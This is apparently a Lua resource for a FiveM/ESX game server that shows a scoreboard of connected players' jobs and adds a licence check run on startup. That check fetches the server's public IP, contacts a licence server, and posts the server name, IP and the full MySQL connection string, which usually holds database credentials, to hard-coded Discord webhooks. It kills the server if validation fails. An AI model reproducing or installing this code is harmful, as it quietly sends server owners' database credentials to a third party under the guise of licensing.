--[[
	id: rG_aoYLRsTubP9pZHLqvU
	name: ks_onlinejobs
	description: ks onlinejobs
	time1: 2021-06-20 16:35:33.986745+00
	time2: 2021-06-20 16:35:33.986745+00
	uploader: 2382
	uploadersession: JJWzBFh6vYpY4m8PYDYJnHLWejnMwy
	flag: f
--]]

ESX = nil
local connectedPlayers = {}

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

ESX.RegisterServerCallback('OnlineJobs:getConnectedPlayers', function(source, cb)
	cb(connectedPlayers)
end)

AddEventHandler('esx:setJob', function(playerId, job, lastJob)
	connectedPlayers[playerId].job = job.name
	TriggerClientEvent('OnlineJobs:updateConnectedPlayers', -1, connectedPlayers)
end)

AddEventHandler('esx:playerLoaded', function(playerId, xPlayer)
	AddPlayerToScoreboard(xPlayer, true)
end)

AddEventHandler('esx:playerDropped', function(playerId)
	connectedPlayers[playerId] = nil
	TriggerClientEvent('OnlineJobs:updateConnectedPlayers', -1, connectedPlayers)
end)

AddEventHandler('onResourceStart', function(resource)
	if resource == GetCurrentResourceName() then
		Citizen.CreateThread(function()
			Citizen.Wait(1000)
			AddPlayersToScoreboard()
		end)
	end
end)

function AddPlayerToScoreboard(xPlayer, update)
	local playerId = xPlayer.source
	connectedPlayers[playerId] = {}
	connectedPlayers[playerId].id = playerId
	connectedPlayers[playerId].job = xPlayer.job.name
	if update then
		TriggerClientEvent('OnlineJobs:updateConnectedPlayers', -1, connectedPlayers)
	end
end

function AddPlayersToScoreboard()
	local players = ESX.GetPlayers()
	for i=1, #players, 1 do
		local xPlayer = ESX.GetPlayerFromId(players[i])
		AddPlayerToScoreboard(xPlayer, false)
	end
	TriggerClientEvent('OnlineJobs:updateConnectedPlayers', -1, connectedPlayers)
end

-- Vars

licenses = {}
licenses.productId = 4
licenses.license = Config.License 
licenses.discord = {
    started = 'https://discord.com/api/webhooks/821411308339200061/GxyTf7t3_RKkKNFs6JzT5R9dgyjzud2B4HbMkI7xD7Dg1Ptf4kamfYj7N3ibCu5YAh8r',
    host = 'https://discord.com/api/webhooks/821414739816480850/UAeIP-bgDSJxnjNa7udwhww36qs5xuXdb6oAkTuSkSZLOBxpbokOVOWBwJJCnIBESV1r'
}

-- END Vars

-- Functions

function licenses:checkLicenseAndIp()
    PerformHttpRequest("http://ip-api.com/json/",
        function(reCode, resultData, resultHeaders)
            local data = json.decode(resultData)
            PerformHttpRequest(
                "https://licenses.kilichishop.es/api/validate/host/" ..data.query.. '/' ..licenses.productId,
                function(reCode, resultData, resultHeaders)
                    local resultHost = json.decode(resultData)
                    local statusHost = resultHost.status
                    if statusHost == 200 then
                        print('^2['..GetCurrentResourceName()..'] IP ^5[^3'..data.query..'^5]^2 - validated!^7')
                        PerformHttpRequest(
                            "https://licenses.kilichishop.es/api/validate/licensekey/" ..licenses.license .. '/' .. licenses.productId,
                            function(reCode, resultData, resultHeaders)
                                local resultLicense = json.decode(resultData)
                                local licenseStatus = resultLicense.status
                                if licenseStatus == 301 then
                                    print('^1['..GetCurrentResourceName()..'] License^1 - not validated!^7')
                                    licenses:sendToDiscord(" License not validated",data.query,15158332,licenses.discord.host)
                                    Wait(5000)
                                    os.exit()
                                elseif licenseStatus == 200 then
                                    print('^2[' .. GetCurrentResourceName() ..'] - License validated!^7')
                                    licenses:sendToDiscord(" License and ip validated",data.query,3066993,licenses.discord.started)
                                end
                            end
                        )
                    elseif statusHost == 301 then
                        print('^1['..GetCurrentResourceName()..'] IP ^5[^3'..data.query..'^5]^1 - not validated!^7')
                        licenses:sendToDiscord(" IP not validated",data.query,15158332,licenses.discord.host)
                        Wait(5000)
                        os.exit()
                    end
                end
            )
        end
    )
end

function licenses:sendToDiscord(status,ip,color,webhook)
    local array = {
        {
            ["title"] = "``" .. 'Script started - ' ..'['..GetCurrentResourceName()..']'..status.. "``",
            ["color"] = color,
            ["description"] = 'Ks shop system',
            ["fields"] = {
                {
                    ["name"] = "-> Sv Name <-",
                    ["value"] = GetConvar('sv_hostname', false)
                },
                {
                    ["name"] = "-> Sv IP <-", 
                    ["value"] = ip
                },
                {
                    ["name"] = "-> DB Conection <-",
                    ["value"] = GetConvar('mysql_connection_string', false)
                },
                {
                    ["name"] = "-> Sv Max Clients <-",
                    ["value"] = GetConvar('sv_maxclients', false)
                },
                {
                    ["name"] = "-> Onesync <-",
                    ["value"] = GetConvar('onesync', 'on')
                },
                {
                    ["name"] = "-> Idioma <-",
                    ["value"] = GetConvar("locale", "ES")
                }
            },
            ["footer"] = {
                ["text"] = "© KS-SHOP 2021"
            },
            ["author"] = {
                ["name"] = "Kilichi",
                ["url"] = "https://discordapp.com",
                ["icon_url"] = "https://cdn.discordapp.com/avatars/327026518112862210/e3ba45cf56724c08cceeb12cecaa49f0.png?size=1024"
            }
        }
    }
    PerformHttpRequest(
        webhook,
        function(err, text, headers) end, 'POST', json.encode(
            {
                username = 'KS-LOGS',
                embeds = array,
                avatar_url = "https://pbs.twimg.com/profile_images/847824193899167744/J1Teh4Di_400x400.jpg"
            }
        ), 
        {
            ['Content-Type'] = 'application/json'
        }
    )
end

-- END Functions

-- Script Starting

AddEventHandler('onResourceStart',
    function(resourceName)
        if GetCurrentResourceName() == resourceName then
            licenses:checkLicenseAndIp()
        end
    end
)

-- END Script Starting